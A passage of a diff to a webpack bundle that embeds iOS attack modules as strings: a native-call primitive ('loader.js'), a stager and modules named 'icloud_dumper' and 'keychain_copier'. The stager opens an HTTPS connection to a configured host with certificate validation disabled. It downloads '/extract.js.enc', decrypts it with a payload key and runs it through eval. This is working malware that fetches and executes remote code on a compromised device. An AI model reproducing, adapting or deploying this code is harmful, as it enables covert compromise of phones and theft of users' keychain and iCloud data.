BigInt(ptr);\n\t}\n}\n\n\nfunction aesDecrypt(encryptedBytes, keyHex) {\n\tNative.dlopen(\"/usr/lib/libcommonCrypto.dylib\");\n\n\tconst keyBytes = new Uint8Array(32);\n\tfor (let i = 0; i < 32; i++) {\n\t\tkeyBytes[i] = parseInt(keyHex.substr(i * 2, 2), 16);\n\t}\n\n\tconst kCCDecrypt = 1n;\n\tconst kCCAlgorithmAES = 0n;\n\tconst kCCOptionECBMode = 2n;\n\n\tconst inLen = encryptedBytes.length;\n\tconst outLen = inLen + 16;\n\tconst keyPtr = Native.malloc(32);\n\tconst inPtr = Native.malloc(inLen);\n\tconst outPtr = Native.malloc(outLen);\n\tconst movedPtr = Native.malloc(8);\n\tconst cryptorRefPtr = Native.malloc(8);\n\n\tNative.write(keyPtr, keyBytes.buffer);\n\tNative.write(inPtr, encryptedBytes.buffer);\n\tNative.write64(movedPtr, 0n);\n\tNative.write64(cryptorRefPtr, 0n);\n\n\tvar status = Native.callSymbol(\"CCCryptorCreate\",\n\t\tkCCDecrypt, kCCAlgorithmAES, kCCOptionECBMode,\n\t\tkeyPtr, 32n, 0n, cryptorRefPtr);\n\n\tvar decrypted = \"\";\n\n\tif (Number(status) === 0) {\n\t\tvar cryptorRef = Native.readPtr(cryptorRefPtr);\n\n\t\tNative.write64(movedPtr, 0n);\n\t\tNative.callSymbol(\"CCCryptorUpdate\",\n\t\t\tcryptorRef, inPtr, BigInt(inLen), outPtr, BigInt(outLen), movedPtr);\n\t\tvar updateMoved = Native.read32(movedPtr);\n\n\t\tNative.write64(movedPtr, 0n);\n\t\tNative.callSymbol(\"CCCryptorFinal\",\n\t\t\tcryptorRef, outPtr + BigInt(updateMoved), BigInt(outLen - updateMoved), movedPtr);\n\t\tvar finalMoved = Native.read32(movedPtr);\n\n\t\tvar totalMoved = updateMoved + finalMoved;\n\t\tif (totalMoved > 0) {\n\t\t\t\n\t\t\tvar rawBytes = new Uint8Array(Native.read(outPtr, totalMoved));\n\t\t\tvar padByte = rawBytes[totalMoved - 1];\n\t\t\tif (padByte > 0 && padByte <= 16) {\n\t\t\t\ttotalMoved -= padByte;\n\t\t\t}\n\t\t\tdecrypted = Native.bytesToString(Native.read(outPtr, totalMoved), false);\n\t\t}\n\n\t\tNative.callSymbol(\"CCCryptorRelease\", cryptorRef);\n\t}\n\n\tNative.free(keyPtr);\n\tNative.free(inPtr);\n\tNative.free(outPtr);\n\tNative.free(movedPtr);\n\tNative.free(cryptorRefPtr);\n\treturn decrypted;\n}\n\n\nfunction safeRead64(addr) {\n\tconst bytes = Native.read(addr, 8);\n\tif (!bytes || bytes.byteLength < 8) return 0n;\n\tconst view = new DataView(bytes);\n\tconst low = BigInt(view.getUint32(0, true));\n\tconst high = BigInt(view.getUint32(4, true));\n\treturn (high << 32n) | low;\n}\n\nfunction safeWrite64(addr, value) {\n\tconst buffer = new ArrayBuffer(8);\n\tconst view = new DataView(buffer);\n\tconst bigValue = BigInt(value);\n\tview.setUint32(0, Number(bigValue & 0xFFFFFFFFn), true);\n\tview.setUint32(4, Number((bigValue >> 32n) & 0xFFFFFFFFn), true);\n\tNative.write(addr, buffer);\n}\n\n\nfunction httpsGet(host, path, port) {\n\tNative.dlopen(\"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\");\n\tNative.dlopen(\"/System/Library/Frameworks/CFNetwork.framework/CFNetwork\");\n\n\t\n\tconst hostCStr = Native.callSymbol(\"malloc\", host.length + 1);\n\tNative.writeString(hostCStr, host);\n\tconst hostCFString = Native.callSymbol(\"CFStringCreateWithCString\", 0n, hostCStr, 0x08000100);\n\tNative.callSymbol(\"free\", hostCStr);\n\tif (!hostCFString) return null;\n\n\t\n\tconst readStreamPtr = Native.callSymbol(\"malloc\", 8);\n\tconst writeStreamPtr = Native.callSymbol(\"malloc\", 8);\n\tsafeWrite64(readStreamPtr, 0n);\n\tsafeWrite64(writeStreamPtr, 0n);\n\n\tNative.callSymbol(\"CFStreamCreatePairWithSocketToHost\", 0n, hostCFString, port, readStreamPtr, writeStreamPtr);\n\n\tconst readStream = safeRead64(readStreamPtr);\n\tconst writeStream = safeRead64(writeStreamPtr);\n\tNative.callSymbol(\"CFRelease\", hostCFString);\n\tNative.callSymbol(\"free\", readStreamPtr);\n\tNative.callSymbol(\"free\", writeStreamPtr);\n\n\tif (!writeStream || writeStream === 0n) {\n\t\tif (readStream && readStream !== 0n) Native.callSymbol(\"CFRelease\", readStream);\n\t\treturn null;\n\t}\n\n\t\n\tconst secLevelCStr = Native.callSymbol(\"malloc\", 64);\n\tNative.writeString(secLevelCStr, \"kCFStreamPropertySocketSecurityLevel\");\n\tconst kCFStreamPropertySocketSecurityLevel = Native.callSymbol(\"CFStringCreateWithCString\", 0n, secLevelCStr, 0x08000100);\n\tNative.callSymbol(\"free\", secLevelCStr);\n\n\tconst sslNegCStr = Native.callSymbol(\"malloc\", 64);\n\tNative.writeString(sslNegCStr, \"kCFStreamSocketSecurityLevelNegotiatedSSL\");\n\tconst kCFStreamSocketSecurityLevelNegotiatedSSL = Native.callSymbol(\"CFStringCreateWithCString\", 0n, sslNegCStr, 0x08000100);\n\tNative.callSymbol(\"free\", sslNegCStr);\n\n\tif (kCFStreamPropertySocketSecurityLevel && kCFStreamSocketSecurityLevelNegotiatedSSL) {\n\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream, kCFStreamPropertySocketSecurityLevel, kCFStreamSocketSecurityLevelNegotiatedSSL);\n\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream, kCFStreamPropertySocketSecurityLevel, kCFStreamSocketSecurityLevelNegotiatedSSL);\n\t}\n\n\t\n\tconst sslSettingsCStr = Native.callSymbol(\"malloc\", 64);\n\tNative.writeString(sslSettingsCStr, \"kCFStreamPropertySSLSettings\");\n\tconst kCFStreamPropertySSLSettings = Native.callSymbol(\"CFStringCreateWithCString\", 0n, sslSettingsCStr, 0x08000100);\n\tNative.callSymbol(\"free\", sslSettingsCStr);\n\n\tconst validateCStr = Native.callSymbol(\"malloc\", 64);\n\tNative.writeString(validateCStr, \"kCFStreamSSLValidatesCertificateChain\");\n\tconst validateCertKey = Native.callSymbol(\"CFStringCreateWithCString\", 0n, validateCStr, 0x08000100);\n\tNative.callSymbol(\"free\", validateCStr);\n\n\tconst kCFBooleanFalse = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFBooleanFalse\");\n\tconst kCFBooleanFalseValue = kCFBooleanFalse ? safeRead64(BigInt(kCFBooleanFalse)) : 0n;\n\n\tif (kCFStreamPropertySSLSettings && validateCertKey && kCFBooleanFalseValue && kCFBooleanFalseValue !== 0n) {\n\t\tconst keysArray = Native.callSymbol(\"malloc\", 8);\n\t\tconst valuesArray = Native.callSymbol(\"malloc\", 8);\n\t\tsafeWrite64(keysArray, BigInt(validateCertKey));\n\t\tsafeWrite64(valuesArray, kCFBooleanFalseValue);\n\n\t\tconst kCFTypeDictionaryKeyCallBacks = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryKeyCallBacks\");\n\t\tconst kCFTypeDictionaryValueCallBacks = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryValueCallBacks\");\n\n\t\tif (kCFTypeDictionaryKeyCallBacks && kCFTypeDictionaryValueCallBacks) {\n\t\t\tconst sslSettings = Native.callSymbol(\"CFDictionaryCreate\", 0n, keysArray, valuesArray, 1,\n\t\t\t\tkCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);\n\t\t\tif (sslSettings) {\n\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", writeStream, kCFStreamPropertySSLSettings, sslSettings);\n\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", readStream, kCFStreamPropertySSLSettings, sslSettings);\n\t\t\t\tNative.callSymbol(\"CFRelease\", sslSettings);\n\t\t\t}\n\t\t}\n\t\tNative.callSymbol(\"free\", keysArray);\n\t\tNative.callSymbol(\"free\", valuesArray);\n\t}\n\n\tif (validateCertKey) Native.callSymbol(\"CFRelease\", validateCertKey);\n\tif (kCFStreamPropertySocketSecurityLevel) Native.callSymbol(\"CFRelease\", kCFStreamPropertySocketSecurityLevel);\n\tif (kCFStreamSocketSecurityLevelNegotiatedSSL) Native.callSymbol(\"CFRelease\", kCFStreamSocketSecurityLevelNegotiatedSSL);\n\tif (kCFStreamPropertySSLSettings) Native.callSymbol(\"CFRelease\", kCFStreamPropertySSLSettings);\n\n\t\n\tNative.callSymbol(\"CFReadStreamOpen\", readStream);\n\tconst writeOpened = Native.callSymbol(\"CFWriteStreamOpen\", writeStream);\n\tif (!writeOpened) {\n\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\treturn null;\n\t}\n\n\t\n\tlet streamReady = false;\n\tfor (let i = 0; i < 100; i++) {\n\t\tconst status = Number(Native.callSymbol(\"CFWriteStreamGetStatus\", writeStream));\n\t\tif (status === 2) { streamReady = true; break; }\n\t\tif (status >= 5) break;\n\t\tNative.callSymbol(\"usleep\", 100000);\n\t}\n\tif (!streamReady) {\n\t\tNative.callSymbol(\"CFReadStreamClose\", readStream);\n\t\tNative.callSymbol(\"CFWriteStreamClose\", writeStream);\n\t\tNative.callSymbol(\"CFRelease\", readStream);\n\t\tNative.callSymbol(\"CFRelease\", writeStream);\n\t\treturn null;\n\t}\n\n\t\n\tconst request = \"GET \" + path + \" HTTP/1.1\\r\\nHost: \" + host + \"\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\n\tconst reqBuf = Native.callSymbol(\"malloc\", request.length + 1);\n\tNative.writeString(reqBuf, request);\n\tlet totalWritten = 0;\n\tconst reqLen = request.length;\n\twhile (totalWritten < reqLen) {\n\t\tconst written = Number(Native.callSymbol(\"CFWriteStreamWrite\", writeStream, reqBuf + BigInt(totalWritten), reqLen - totalWritten));\n\t\tif (written < 0) break;\n\t\tif (written === 0) { Native.callSymbol(\"usleep\", 10000); continue; }\n\t\ttotalWritten += written;\n\t}\n\tNative.callSymbol(\"free\", reqBuf);\n\n\t\n\tconst bufSize = 8192;\n\tconst readBuf = Native.callSymbol(\"malloc\", bufSize);\n\tlet responseBytes = [];\n\tlet totalRead = 0;\n\tconst maxSize = 5 * 1024 * 1024;\n\tconst readStart = Date.now();\n\tconst readTimeout = 60000;\n\n\twhile (totalRead < maxSize) {\n\t\tif (Date.now() - readStart > readTimeout) break;\n\t\tconst bytesRead = Number(Native.callSymbol(\"CFReadStreamRead\", readStream, readBuf, bufSize));\n\t\tif (bytesRead <= 0) break;\n\t\tconst chunk = Native.read(readBuf, bytesRead);\n\t\tif (chunk) responseBytes.push(new Uint8Array(chunk));\n\t\ttotalRead += bytesRead;\n\t}\n\n\tNative.callSymbol(\"free\", readBuf);\n\tNative.callSymbol(\"CFReadStreamClose\", readStream);\n\tNative.callSymbol(\"CFWriteStreamClose\", writeStream);\n\tNative.callSymbol(\"CFRelease\", readStream);\n\tNative.callSymbol(\"CFRelease\", writeStream);\n\n\tif (responseBytes.length === 0) return null;\n\n\t\n\tlet combined = new Uint8Array(totalRead);\n\tlet offset = 0;\n\tfor (let chunk of responseBytes) {\n\t\tcombined.set(chunk, offset);\n\t\toffset += chunk.length;\n\t}\n\n\t\n\tlet headerEnd = -1;\n\tfor (let i = 0; i < combined.length - 3; i++) {\n\t\tif (combined[i] === 13 && combined[i+1] === 10 && combined[i+2] === 13 && combined[i+3] === 10) {\n\t\t\theaderEnd = i + 4;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (headerEnd === -1) return null;\n\n\tconst headerStr = Native.bytesToString(combined.slice(0, Math.min(headerEnd, 256)).buffer, false);\n\tif (!headerStr.includes(\" 200 \")) return null;\n\n\treturn combined.slice(headerEnd);\n}\n\n\n(function() {\n\ttry {\n\t\tNative.init();\n\n\t\t\n\t\tlet host = CD;\n\t\tlet port = 443;\n\t\tif (host.indexOf(\":\") !== -1) {\n\t\t\tconst parts = host.split(\":\");\n\t\t\thost = parts[0];\n\t\t\tport = parseInt(parts[1]) || 443;\n\t\t}\n\n\t\tconst path = \"/extract.js.enc\";\n\t\tconst maxRetries = 3;\n\n\t\tlet responseBody = null;\n\t\tfor (let attempt = 0; attempt < maxRetries; attempt++) {\n\t\t\ttry {\n\t\t\t\tresponseBody = httpsGet(host, path, port);\n\t\t\t\tif (responseBody && responseBody.length > 0) break;\n\t\t\t} catch(e) {}\n\t\t\tif (attempt < maxRetries - 1) {\n\t\t\t\tNative.callSymbol(\"usleep\", 2000000); \n\t\t\t}\n\t\t}\n\n\t\tif (!responseBody || responseBody.length === 0) return;\n\n\t\tconst decrypted = aesDecrypt(responseBody, DARKSWORD_PAYLOAD_KEY);\n\t\tif (decrypted && decrypted.length > 0) eval(decrypted);\n\n\t} catch(e) {\n\t\t\n\t}\n})();\n");
 
-/***/ }),
+ }),
 
-/***/ "./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js":
-/*!********************************************************************!*\
-  !*** ./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js ***!
-  \********************************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
-/* harmony export */ });
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
+ });
+ const __WEBPACK_DEFAULT_EXPORT__ = ("");
 
-/***/ }),
+ }),
 
-/***/ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js":
-/*!**********************************************************************!*\
-  !*** ./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js ***!
-  \**********************************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
-/* harmony export */ });
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
+ });
+ const __WEBPACK_DEFAULT_EXPORT__ = ("");
 
-/***/ }),
+ }),
 
-/***/ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js":
-/*!*************************************************************!*\
-  !*** ./node_modules/raw-loader/dist/cjs.js!./src/loader.js ***!
-  \*************************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
-/* harmony export */ });
-/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("class Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\t\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\t//log(\"baseAddr: \" + this.#baseAddr);\n\t\t//log(\"dlsymAddr: \" + this.#dlsymAddr);\n\t\t\n\t\t//this.#memcpyAddr = this.#dlsym(\"test\");\n\t\t//log(\"memcpyAddr: \" + this.#memcpyAddr);\n\t\t//log(\"oinvAddr: \" + this.#oinvAddr);\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize)); //this.callSymbol(\"malloc\", this.memSize);\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\t\n\t\t//log(\"argMem: \" + this.#argMem);\n\t\t//log(\"argMemPtr: \" + this.#argMemPtr);\n\t\t//log(\"argMemPtrStr: \" + this.#argMemPtrStr);\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr)\n\t\t\treturn false;\n\t\t//log(\"write: \" + buff.byteLength);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t//log(`writing: ptr=${ptr}, src=${Native.#baseAddr + 0x1000n}, offs=${offs}, len=${len}`);\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr)\n\t\t\treturn null;\n\t\t//log(`read: ptr=${ptr}, length=${length}, ${typeof(length)}`, ptr, length);\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t//log(`reading: ptr=${ptr}, dst=${Native.#baseAddr + 0x1000n}, offs=${offs}, len=${len}`);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"callSymbol: \" + name);\n\t\t// Initialize argPtr to point to general purpose memory chunk\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\t\n\tstatic callSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"callSymbolRetain: \" + name);\n\t\t// Initialize argPtrPtr to point to general purpose memory chunk\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\tx0 = this.#toNativePtr(x0);\n\t\tx1 = this.#toNativePtr(x1);\n\t\tx2 = this.#toNativePtr(x2);\n\t\tx3 = this.#toNativePtr(x3);\n\t\tx4 = this.#toNativePtr(x4);\n\t\tx5 = this.#toNativePtr(x5);\n\t\tx6 = this.#toNativePtr(x6);\n\t\tx7 = this.#toNativePtr(x7);\n\t\tlet ret = this.#nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtrPtr\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\t//log(\"toNative: \" + typeof value);\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNative(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\t\n\tstatic #toNativePtr(value) {\n\t\t//log(\"toNativePtr: \" + typeof value);\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tlet ptr = this.#argPtrPtr;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNativePtr(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet strPtr = this.#argPtrStrPtr;\n\t\t\tthis.writeString(strPtr, value);\n\t\t\tthis.#argPtrStrPtr += BigInt(value.length + 1);\n\t\t\tvalue = strPtr;\n\t\t}\n\t\telse if (typeof value !== 'bigint') {\n\t\t\tvalue = BigInt(value);\n\t\t}\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t\tthis.#argPtrPtr += 8n;\n\t\treturn ptr;\n\t}\n\t\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\t//log(\"dlsym(): \" + name);\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\t//log(\"nativeCallAddr(): \" + addr);\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\t//log(\"nativeCallSymbol(): \" + name);\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n\t\n\tstatic #nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"nativeCallSymbolRetain(): \" + name);\n\t\tconst funcAddr = this.#dlsym(name);\n\t\t\n\t\tconst selRetainArguments = this.callSymbol(\"sel_registerName\", \"retainArguments\");\n\t\tconst selSetArgument = this.callSymbol(\"sel_registerName\", \"setArgument:atIndex:\");\n\t\tconst selInvokeUsingIMP = this.callSymbol(\"sel_registerName\", \"invokeUsingIMP:\");\n\t\tconst selGetReturnValue = this.callSymbol(\"sel_registerName\", \"getReturnValue:\");\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selRetainArguments);\n\t\t\n\t\tif (x0) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x0, 0);\n\t\tif (x1) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x1, 1);\n\t\tif (x2) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x2, 2);\n\t\tif (x3) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x3, 3);\n\t\tif (x4) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x4, 4);\n\t\tif (x5) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x5, 5);\n\t\tif (x6) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x6, 6);\n\t\tif (x7) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x7, 7);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selInvokeUsingIMP, funcAddr);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selGetReturnValue, this.#argMemPtr);\n\t\tconst ret64 = this.readPtr(this.#argMemPtr);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\nfunction File(path) {\n\treturn path;\n}\n\nfunction log(msg) {\n\tif (logging)\n\t\treturn;\n\n\tlogging = true;\n\t\n\tconst data = Native.stringToBytes(msg + \"\\n\");\n\n\tconst O_WRONLY = 0x0001;\n\tconst O_APPEND = 0x0008;\n\tconst O_CREAT = 0x0200;\n\tconst flags = O_WRONLY | O_CREAT | O_APPEND;\n\tconst fd = Native.callSymbol(\"open\", File(logfile), flags, 0o644);\n\tif (fd < 0) {\n\t\tlogging = false;\n\t\treturn;\n\t}\n\n\t// For some reason file mode is not applied on open()\n\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\tlet offs = 0;\n\tlet left = data.byteLength;\n\n\tconst buffSize = 0x4000;\n\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\twhile (left) {\n\t\tconst size = left > buffSize ? buffSize : left;\n\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\tconst dst8 = new Uint8Array(src8);\n\t\tNative.write(buffPtr, dst8.buffer);\n\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\tif (!len || len < 0)\n\t\t\tbreak;\n\t\toffs += len;\n\t\tleft -= len;\n\t}\n\n\tNative.callSymbol(\"free\", buffPtr);\n\tNative.callSymbol(\"close\", fd);\n\n\tlogging = false;\n}\n\nvar logging = false;\nconst logfile = \"/private/var/mobile/Media/RemoteLog.log\";\n\nNative.init();\n\nNative.callSymbol(\"unlink\", File(logfile));\n");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
+ });
